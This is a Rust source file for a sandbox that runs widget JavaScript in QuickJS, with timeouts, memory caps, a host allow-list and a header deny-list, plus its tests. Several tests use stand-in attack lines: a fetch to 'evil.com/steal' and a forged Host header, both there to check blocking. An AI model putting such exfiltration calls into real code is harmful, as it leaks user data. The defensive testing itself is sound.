//! Runs one widget's `widget.js` in an isolated QuickJS runtime with time and
//! memory limits and a minimal host API (fetch, storage, log, time, format).

mod host;
mod permissions;

use std::future::Future;
use std::path::PathBuf;
use std::pin::Pin;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use rquickjs::prelude::Async;
use rquickjs::{
    AsyncContext, AsyncRuntime, CaughtError, Ctx, Exception, Function, Module, Promise,
};
use serde::{Deserialize, Serialize};
use serde_json::{Map, Value};

use crate::display::Output;
use crate::manifest::Manifest;

/// Wall-time and JS heap limits for one run.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct Limits {
    pub timeout: Duration,
    pub memory_bytes: usize,
}

impl Default for Limits {
    fn default() -> Self {
        Limits {
            timeout: Duration::from_secs(10),
            memory_bytes: 32 * 1024 * 1024,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Deserialize)]
pub struct HttpRequest {
    pub method: String,
    pub url: String,
    pub headers: Vec<(String, String)>,
    pub body: Option<String>,
    /// Hostnames the widget may contact; set by `send`, never by widget code.
    /// A client that follows redirects must re-check every hop against these.
    #[serde(skip)]
    pub allowed_hosts: Vec<String>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct HttpResponse {
    pub status: u16,
    pub headers: Vec<(String, String)>,
    pub body: String,
}

pub type HttpFuture<'a> = Pin<Box<dyn Future<Output = Result<HttpResponse, String>> + Send + 'a>>;

/// Performs a widget's HTTP request.
pub trait HttpClient: Send + Sync {
    fn send(&self, req: HttpRequest) -> HttpFuture<'_>;
}

pub struct RunContext {
    pub manifest: Arc<Manifest>,
    pub widget_dir: PathBuf,
    pub instance_id: String,
    pub settings: Map<String, Value>,
    pub http: Arc<dyn HttpClient>,
    /// Per-instance storage file (`paths::storage_file(&instance_id)`).
    pub storage_path: PathBuf,
    pub limits: Limits,
}

#[derive(Debug, thiserror::Error)]
pub enum RunError {
    #[error("widget timed out")]
    Timeout,
    #[error("widget ran out of memory")]
    OutOfMemory,
    #[error("script error: {0}")]
    Script(String),
    #[error("bad output: {0}")]
    BadOutput(String),
    #[error("permission denied: {0}")]
    Permission(String),
}

const PRELUDE: &str = include_str!("prelude.js");

/// Runs `widget.js` once in a fresh runtime and returns its parsed output.
/// Storage changes are saved even when the run fails or times out.
pub async fn run(ctx: RunContext) -> Result<Output, RunError> {
    let source = std::fs::read_to_string(ctx.widget_dir.join("widget.js"))
        .map_err(|e| RunError::Script(format!("cannot read widget.js: {e}")))?;
    let storage = Arc::new(Mutex::new(host::Storage::load(ctx.storage_path.clone())));
    let limits = ctx.limits;
    let violation = Arc::new(Mutex::new(None));

    let result = tokio::time::timeout(
        limits.timeout,
        execute(&ctx, source, storage.clone(), violation.clone()),
    )
    .await
    .unwrap_or(Err(RunError::Timeout));

    if let Err(e) = storage.lock().unwrap().save_if_dirty() {
        log::warn!("[{}] could not save storage: {e}", ctx.instance_id);
    }

    let json = result?.ok_or_else(|| RunError::BadOutput("widget returned nothing".into()))?;
    let value: Value =
        serde_json::from_str(&json).map_err(|e| RunError::BadOutput(e.to_string()))?;
    crate::display::parse(value).map_err(|e| RunError::BadOutput(e.to_string()))
}

/// Evaluates the prelude and widget in a fresh runtime + context; returns the
/// JSON text of the widget's result (`None` if it returned `undefined`).
async fn execute(
    ctx: &RunContext,
    source: String,
    storage: Arc<Mutex<host::Storage>>,
    violation: Violation,
) -> Result<Option<String>, RunError> {
    let script_err = |e: rquickjs::Error| RunError::Script(e.to_string());
    let rt = AsyncRuntime::new().map_err(script_err)?;
    rt.set_memory_limit(ctx.limits.memory_bytes).await;
    let interrupted = Arc::new(AtomicBool::new(false));
    let deadline = Instant::now() + ctx.limits.timeout;
    let flag = interrupted.clone();
    rt.set_interrupt_handler(Some(Box::new(move || {
        let expired = Instant::now() >= deadline;
        if expired {
            flag.store(true, Ordering::Relaxed);
        }
        expired
    })))
    .await;
    let js = AsyncContext::full(&rt).await.map_err(script_err)?;

    let instance_id = ctx.instance_id.clone();
    let http = ctx.http.clone();
    let allowed = ctx.manifest.permissions.network.clone();
    let seen = violation.clone();
    let settings = Value::Object(ctx.settings.clone()).to_string();
    js.async_with(async move |ctx| {
        let result: rquickjs::Result<Option<String>> = async {
            host::install(&ctx, storage, instance_id)?;
            install_fetch(&ctx, http, allowed, seen)?;
            let invoke: Function = ctx.eval(PRELUDE)?;
            let (module, loaded) = Module::declare(ctx.clone(), "widget.js", source)?.eval()?;
            loaded.into_future::<()>().await?;
            let update: rquickjs::Value = module.get("default")?;
            let pending: Promise = invoke.call((update, settings))?;
            pending.into_future::<Option<String>>().await
        }
        .await;
        result.map_err(|e| classify(&ctx, e, &interrupted, &violation))
    })
    .await
}

/// Maps an engine error to a `RunError`, telling limits apart from script bugs.
fn classify(
    ctx: &Ctx<'_>,
    err: rquickjs::Error,
    interrupted: &AtomicBool,
    violation: &Violation,
) -> RunError {
    if matches!(err, rquickjs::Error::Allocation) {
        return RunError::OutOfMemory;
    }
    let message = CaughtError::from_error(ctx, err).to_string();
    if interrupted.load(Ordering::Relaxed) {
        RunError::Timeout
    } else if message.contains("out of memory") {
        RunError::OutOfMemory
    } else if let Some(v) = violation
        .lock()
        .unwrap()
        .as_ref()
        .filter(|v| message.contains(*v))
    {
        RunError::Permission(v.clone())
    } else {
        RunError::Script(message)
    }
}

/// The last permission violation a fetch raised; lets an uncaught rejection
/// be reported as `RunError::Permission` instead of a plain script error.
type Violation = Arc<Mutex<Option<String>>>;

/// Installs the hidden `__host_fetch(reqJson) -> Promise<respJson>`.
fn install_fetch<'js>(
    ctx: &Ctx<'js>,
    http: Arc<dyn HttpClient>,
    allowed: Vec<String>,
    violation: Violation,
) -> rquickjs::Result<()> {
    let fetch = Function::new(
        ctx.clone(),
        Async(move |ctx: Ctx<'js>, req: String| {
            let http = http.clone();
            let allowed = allowed.clone();
            let violation = violation.clone();
            async move {
                let req: HttpRequest = serde_json::from_str(&req)
                    .map_err(|e| Exception::throw_type(&ctx, &format!("fetch: {e}")))?;
                let resp = match send(http.as_ref(), req, &allowed).await {
                    Ok(resp) => resp,
                    Err(SendError::Denied(msg)) => {
                        log::warn!("blocked widget request: {msg}");
                        *violation.lock().unwrap() = Some(msg.clone());
                        return Err(Exception::throw_type(&ctx, &msg));
                    }
                    Err(SendError::Failed(e)) => {
                        return Err(Exception::throw_message(
                            &ctx,
                            &format!("fetch failed: {e}"),
                        ));
                    }
                };
                serde_json::to_string(&resp)
                    .map_err(|e| Exception::throw_message(&ctx, &format!("fetch: {e}")))
            }
        }),
    )?;
    ctx.globals().set("__host_fetch", fetch)
}

enum SendError {
    /// The URL is not on the widget's allow-list.
    Denied(String),
    Failed(String),
}

/// Every widget request goes through here: the URL allow-list and the header
/// deny-list are checked first.
async fn send(
    http: &dyn HttpClient,
    mut req: HttpRequest,
    allowed: &[String],
) -> Result<HttpResponse, SendError> {
    let checked = permissions::check_url(&req.url, allowed).map_err(SendError::Denied)?;
    // Hand the client the URL that was checked, not the raw widget string.
    req.url = checked.into();
    permissions::check_headers(&req.headers).map_err(SendError::Denied)?;
    req.allowed_hosts = allowed.to_vec();
    http.send(req).await.map_err(SendError::Failed)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::display::Block;
    use serde_json::json;
    use std::time::Instant;

    struct FakeHttp {
        body: String,
    }

    impl HttpClient for FakeHttp {
        fn send(&self, req: HttpRequest) -> HttpFuture<'_> {
            let body = self.body.clone();
            Box::pin(async move {
                Ok(HttpResponse {
                    status: 200,
                    headers: vec![("Content-Type".into(), "application/json".into())],
                    body: body.replace("{url}", &req.url),
                })
            })
        }
    }

    struct Fixture {
        dir: tempfile::TempDir,
        settings: Map<String, Value>,
        limits: Limits,
        http_body: String,
        network: Vec<String>,
        http: Option<Arc<dyn HttpClient>>,
    }

    /// An HTTP client whose requests never complete.
    struct HangHttp;

    impl HttpClient for HangHttp {
        fn send(&self, _req: HttpRequest) -> HttpFuture<'_> {
            Box::pin(std::future::pending())
        }
    }

    impl Fixture {
        fn new(js: &str) -> Fixture {
            let dir = tempfile::tempdir().unwrap();
            std::fs::write(dir.path().join("widget.js"), js).unwrap();
            Fixture {
                dir,
                settings: Map::new(),
                limits: Limits::default(),
                http_body: "{}".into(),
                network: Vec::new(),
                http: None,
            }
        }

        fn storage_path(&self) -> PathBuf {
            self.dir.path().join("storage").join("inst-1.json")
        }

        fn ctx(&self) -> RunContext {
            let manifest: Manifest = serde_json::from_value(json!({
                "id": "test",
                "name": "Test",
                "formatVersion": 1,
                "permissions": {"network": self.network},
            }))
            .unwrap();
            RunContext {
                manifest: Arc::new(manifest),
                widget_dir: self.dir.path().to_path_buf(),
                instance_id: "inst-1".into(),
                settings: self.settings.clone(),
                http: self.http.clone().unwrap_or_else(|| {
                    Arc::new(FakeHttp {
                        body: self.http_body.clone(),
                    })
                }),
                storage_path: self.storage_path(),
                limits: self.limits,
            }
        }

        async fn run(&self) -> Result<Output, RunError> {
            run(self.ctx()).await
        }
    }

    fn text(out: &Output) -> &str {
        match &out.frames[0].blocks[0] {
            Block::Text { value, .. } => value,
            other => panic!("expected text block, got {other:?}"),
        }
    }

    /// Wraps a JS expression as a widget returning it as a single text block.
    fn returning(expr: &str) -> String {
        format!(
            "export default async function update({{ settings, storage, log, time }}) {{\n\
             return {{ blocks: [{{ type: \"text\", value: String({expr}) }}] }};\n}}"
        )
    }

    #[allow(dead_code)]
    fn run_future_is_send(ctx: RunContext) {
        fn is_send<T: Send>(_: T) {}
        is_send(run(ctx));
    }

    #[tokio::test]
    async fn returns_parsed_output() {
        let f = Fixture::new(
            r#"export default async function update() {
                return { blocks: [{ type: "text", value: "hi" }] };
            }"#,
        );
        let out = f.run().await.unwrap();
        assert_eq!(text(&out), "hi");
    }

    #[tokio::test]
    async fn settings_are_passed() {
        let mut f = Fixture::new(&returning("settings.city"));
        f.settings.insert("city".into(), json!("Lisbon"));
        assert_eq!(text(&f.run().await.unwrap()), "Lisbon");
    }

    #[tokio::test]
    async fn script_error_reports_message() {
        let f = Fixture::new(
            "export default async function update() {\n  throw new Error(\"boom\");\n}",
        );
        match f.run().await {
            Err(RunError::Script(m)) => {
                assert!(m.contains("boom"), "{m}");
                assert!(m.contains("widget.js:2"), "line missing: {m}");
            }
            other => panic!("expected Script error, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn sandbox_timeout_is_error() {
        let mut f = Fixture::new("export default async function update() { while (true) {} }");
        f.limits.timeout = Duration::from_millis(200);
        let start = Instant::now();
        let res = f.run().await;
        assert!(matches!(res, Err(RunError::Timeout)), "{res:?}");
        assert!(start.elapsed() < Duration::from_secs(5));
    }

    #[tokio::test]
    async fn awaiting_forever_is_timeout() {
        let mut f =
            Fixture::new("export default async function update() { await new Promise(() => {}); }");
        f.limits.timeout = Duration::from_millis(200);
        let res = f.run().await;
        assert!(matches!(res, Err(RunError::Timeout)), "{res:?}");
    }

    #[tokio::test]
    async fn memory_limit_is_error() {
        let mut f = Fixture::new(
            r#"export default async function update() {
                const keep = [];
                while (true) keep.push(new Array(100000).fill(1.5));
            }"#,
        );
        f.limits.timeout = Duration::from_secs(5);
        let res = f.run().await;
        assert!(matches!(res, Err(RunError::OutOfMemory)), "{res:?}");
    }

    #[tokio::test]
    async fn invalid_output_is_error() {
        let f = Fixture::new("export default async function update() { return 42; }");
        let res = f.run().await;
        assert!(matches!(res, Err(RunError::BadOutput(_))), "{res:?}");
    }

    #[tokio::test]
    async fn storage_persists_between_runs() {
        let f = Fixture::new(&returning(
            "(() => { const n = (storage.get(\"n\") ?? 0) + 1; storage.set(\"n\", n); return n; })()",
        ));
        assert_eq!(text(&f.run().await.unwrap()), "1");
        assert_eq!(text(&f.run().await.unwrap()), "2");
        let saved: Value =
            serde_json::from_str(&std::fs::read_to_string(f.storage_path()).unwrap()).unwrap();
        assert_eq!(saved, json!({"n": 2}));
    }

    #[tokio::test]
    async fn storage_set_before_error_is_kept() {
        let f = Fixture::new(
            r#"export default async function update({ storage }) {
                storage.set("seen", true);
                throw new Error("later failure");
            }"#,
        );
        assert!(matches!(f.run().await, Err(RunError::Script(_))));
        let saved: Value =
            serde_json::from_str(&std::fs::read_to_string(f.storage_path()).unwrap()).unwrap();
        assert_eq!(saved, json!({"seen": true}));
    }

    #[tokio::test]
    async fn storage_over_64kb_throws_and_is_not_saved() {
        let f = Fixture::new(&returning(
            "(() => { storage.set(\"small\", 1); \
             try { storage.set(\"big\", \"x\".repeat(70000)); return \"stored\"; } \
             catch (e) { return \"threw\"; } })()",
        ));
        assert_eq!(text(&f.run().await.unwrap()), "threw");
        let saved: Value =
            serde_json::from_str(&std::fs::read_to_string(f.storage_path()).unwrap()).unwrap();
        assert_eq!(saved, json!({"small": 1}));
    }

    #[tokio::test]
    async fn no_node_or_browser_globals() {
        let f = Fixture::new(&returning(
            "[typeof require, typeof process, typeof window, typeof XMLHttpRequest, \
              typeof __host_fetch, typeof globalThis.__host_fetch].join(\",\")",
        ));
        assert_eq!(
            text(&f.run().await.unwrap()),
            "undefined,undefined,undefined,undefined,undefined,undefined"
        );
    }

    #[tokio::test]
    async fn time_now_respects_timezone() {
        let f = Fixture::new(&returning(
            "[time.now(\"Asia/Tokyo\").offsetMinutes, typeof time.now().hhmm].join(\",\")",
        ));
        assert_eq!(text(&f.run().await.unwrap()), "540,string");
    }

    #[tokio::test]
    async fn time_now_unknown_tz_is_type_error() {
        let f = Fixture::new(&returning(
            "(() => { try { time.now(\"Mars/Base\"); return \"ok\"; } \
             catch (e) { return e instanceof TypeError; } })()",
        ));
        assert_eq!(text(&f.run().await.unwrap()), "true");
    }

    #[tokio::test]
    async fn format_money_usd() {
        let f = Fixture::new(&returning(
            "[format.money(67120.4, \"USD\"), format.money(3.456, \"EUR\")].join(\"|\")",
        ));
        assert_eq!(text(&f.run().await.unwrap()), "$67,120|€3.46");
    }

    #[tokio::test]
    async fn fetch_uses_http_client() {
        let mut f = Fixture::new(&returning(
            "await (async () => { const r = await fetch(\"https://api.example.com/x\"); \
             const j = await r.json(); return [r.ok, r.status, j.url].join(\",\"); })()",
        ));
        f.http_body = r#"{"url": "{url}"}"#.into();
        f.network = vec!["api.example.com".into()];
        assert_eq!(
            text(&f.run().await.unwrap()),
            "true,200,https://api.example.com/x"
        );
    }

    #[tokio::test]
    async fn console_log_is_available() {
        let f = Fixture::new(&returning(
            "(() => { console.log(\"a\", 1, { b: 2 }); log(\"c\"); return \"logged\"; })()",
        ));
        assert_eq!(text(&f.run().await.unwrap()), "logged");
    }

    const UNDECLARED_FETCH: &str = "await fetch(\"https://evil.com/steal\")";

    #[tokio::test]
    async fn undeclared_fetch_rejects_promise_in_js() {
        let mut f = Fixture::new(&returning(&format!(
            "await (async () => {{ try {{ {UNDECLARED_FETCH}; return \"fetched\"; }}              catch (e) {{ return e.name + \": \" + e.message; }} }})()"
        )));
        f.network = vec!["api.example.com".into()];
        let out = f.run().await.unwrap();
        assert!(
            text(&out).contains("host not allowed: evil.com"),
            "{}",
            text(&out)
        );
        assert!(text(&out).starts_with("TypeError"), "{}", text(&out));
    }

    #[tokio::test]
    async fn uncaught_undeclared_fetch_is_permission_error() {
        let mut f = Fixture::new(&format!(
            "export default async function update() {{ {UNDECLARED_FETCH}; return {{ blocks: [] }}; }}"
        ));
        f.network = vec!["api.example.com".into()];
        match f.run().await {
            Err(RunError::Permission(m)) => {
                assert!(m.contains("host not allowed: evil.com"), "{m}")
            }
            other => panic!("expected Permission error, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn timeout_during_pending_fetch() {
        let mut f = Fixture::new(&returning("await fetch(\"https://api.example.com/slow\")"));
        f.network = vec!["api.example.com".into()];
        f.http = Some(Arc::new(HangHttp));
        f.limits.timeout = Duration::from_millis(200);
        let start = Instant::now();
        let res = f.run().await;
        assert!(matches!(res, Err(RunError::Timeout)), "{res:?}");
        assert!(start.elapsed() < Duration::from_secs(5));
    }

    #[tokio::test]
    async fn forbidden_header_rejects_fetch_with_type_error() {
        let mut f = Fixture::new(&returning(
            "await (async () => { try { await fetch(\"https://api.example.com/x\",              { headers: { Host: \"evil.com\" } }); return \"sent\"; }              catch (e) { return e.name + \": \" + e.message; } })()",
        ));
        f.network = vec!["api.example.com".into()];
        assert_eq!(
            text(&f.run().await.unwrap()),
            "TypeError: Perchbar: header not allowed: Host"
        );
    }
}
